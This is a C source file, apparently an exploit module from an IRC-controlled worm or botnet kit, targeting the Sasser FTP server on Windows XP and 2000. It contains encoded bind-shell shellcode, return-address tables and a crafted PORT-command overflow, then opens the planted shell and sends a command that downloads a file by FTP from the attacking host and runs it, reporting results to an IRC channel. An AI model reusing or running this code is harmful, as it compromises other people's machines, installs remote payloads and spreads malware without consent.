#include "includes.h"
#include "functions.h"
#include "extern.h"

#ifndef NO_SASSER

char bsh[] =
   "\xEB\x0F\x8B\x34\x24\x33\xC9\x80\xC1\xDD\x80\x36\xDE\x46\xE2\xFA"
   "\xC3\xE8\xEC\xFF\xFF\xFF\xBA\xB9\x51\xD8\xDE\xDE\x60\xDE\xFE\x9E"
   "\xDE\xB6\xED\xEC\xDE\xDE\xB6\xA9\xAD\xEC\x81\x8A\x21\xCB\xDA\xFE"
   "\x9E\xDE\x49\x47\x8C\x8C\x8C\x8C\x9C\x8C\x9C\x8C\x36\xD5\xDE\xDE"
   "\xDE\x89\x8D\x9F\x8D\xB1\xBD\xB5\xBB\xAA\x9F\xDE\x89\x21\xC8\x21"
   "\x0E\x4D\xB4\xDE\xB6\xDC\xDE\xCA\x6A\x55\x1A\xB4\xCE\x8E\x8D\x36"
   "\xDB\xDE\xDE\xDE\xBC\xB7\xB0\xBA\xDE\x89\x21\xC8\x21\x0E\xB4\xDF"
   "\x8D\x36\xD9\xDE\xDE\xDE\xB2\xB7\xAD\xAA\xBB\xB0\xDE\x89\x21\xC8"
   "\x21\x0E\xB4\xDE\x8A\x8D\x36\xD9\xDE\xDE\xDE\xBF\xBD\xBD\xBB\xAE"
   "\xAA\xDE\x89\x21\xC8\x21\x0E\x55\x06\xED\x1E\xB4\xCE\x87\x55\x22"
   "\x89\xDD\x27\x89\x2D\x75\x55\xE2\xFA\x8E\x8E\x8E\xB4\xDF\x8E\x8E"
   "\x36\xDA\xDE\xDE\xDE\xBD\xB3\xBA\xDE\x8E\x36\xD1\xDE\xDE\xDE\x9D"
   "\xAC\xBB\xBF\xAA\xBB\x8E\xAC\xB1\xBD\xBB\xAD\xAD\x9F\xDE\x18\xD9"
   "\x9A\x19\x99\xF2\xDF\xDF\xDE\xDE\x5D\x19\xE6\x4D\x75\x75\x75\xBA"
   "\xB9\x7F\xEE\xDE\x55\x9E\xD2\x55\x9E\xC2\x55\xDE\x21\xAE\xD6\x21"
   "\xC8\x21\x0E";

struct { char *os; long goreg; long gpa; long lla; } targets[] = {
	{ "wXP SP1 many", 0x77BEEB23, 0x77be10CC, 0x77be10D0 },
	{ "wXP SP1 most others", 0x77C1C0BD, 0x77C110CC, 0x77c110D0 },
	{ "w2k SP4 many", 0x7801D081, 0x780320cc, 0x780320d0 },
};

void setoff(long GPA, long LLA)
{
   int gpa = GPA ^ 0xdededede,
	   lla = LLA ^ 0xdededede;

   memcpy(bsh+0x1d, &gpa, 4);
   memcpy(bsh+0x2e, &lla, 4);
}

BOOL sasser(EXINFO exinfo)
{
	int tType, targetOS;
	char szBuffer[4096], cmd_buff[400], buffer[IRCLINE];
	char *jmp[] = {
		"\xeb\x06",
		"\xe9\x13\xfc\xff\xff"
	};
	SOCKET sSocket;
	SOCKADDR_IN ssin;

	targetOS = FpHost(exinfo.ip, FP_RPC);
	if (targetOS == OS_UNKNOWN)
		tType = 0;
	else if (targetOS == OS_WINNT)
		return FALSE;
	else if (targetOS == OS_WIN2K)
		tType = 2;
	else if (rand() % 10)
		tType = 0;
	else
		tType = 1;

	if ((sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR)
		return FALSE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(exinfo.port);
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

	if (fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin)) == -1) {
		fclosesocket(sSocket);
		return FALSE;
	}

	strncpy(szBuffer, "USER x\n", sizeof(szBuffer));
	if (fsend(sSocket, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}
	frecv(sSocket, szBuffer, sizeof(szBuffer), 0);
	strncpy(szBuffer, "PASS x\n", sizeof(szBuffer));
	if (fsend(sSocket, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}
	frecv(sSocket, szBuffer, sizeof(szBuffer), 0);

	memset(szBuffer, 0x90, 2000);
	strncpy(szBuffer, "PORT ", 5);
	strcat(szBuffer, "\x0a");
	memcpy(szBuffer+272, jmp[0], 2);
	memcpy(szBuffer+276, &targets[tType].goreg, 4);
	memcpy(szBuffer+280, jmp[1], 5);

	setoff(targets[tType].gpa, targets[tType].lla);

	memcpy(szBuffer+300, &bsh, strlen(bsh));

	if (fsend(sSocket, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}

	fclosesocket(sSocket);

	if ((sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR)
		return FALSE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(5300);
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

	if (fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin)) == -1) {
		fclosesocket(sSocket);
		return FALSE;
	}

	if (frecv(sSocket, szBuffer, sizeof(szBuffer), 0) > 0) {
		Sleep(500);

	//	_snprintf(cmd_buff, sizeof(cmd_buff),
	//		"tftp -i %s get %s&%s&exit\n", GetIP(exinfo.sock), filename, filename);
		/*  GetIP(exinfo.sock),  */

		
		_snprintf(cmd_buff, sizeof (cmd_buff),
		"del eq&echo open %s %d >> eq&echo user %d %d >> eq &echo get %s >> eq &echo quit >> eq &ftp -n -s:eq &%s&del eq\r\n", GetIP(exinfo.sock), FTP_PORT, rand(), rand(), filename, filename);	
	
		
		if (fsend(sSocket, cmd_buff, strlen(cmd_buff), 0) == SOCKET_ERROR) {
			fclosesocket(sSocket);
			return FALSE;
		}

		fclosesocket(sSocket);

		_snprintf(buffer, sizeof(buffer), "[%s] from [%s] EXPLO: %s.", exploit[exinfo.exploit].name, GetIP(exinfo.sock), exinfo.ip);
		if (!exinfo.silent)
			irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;

		return TRUE;
	} else
		return FALSE;
}

#endif	/* !NO_SASSER */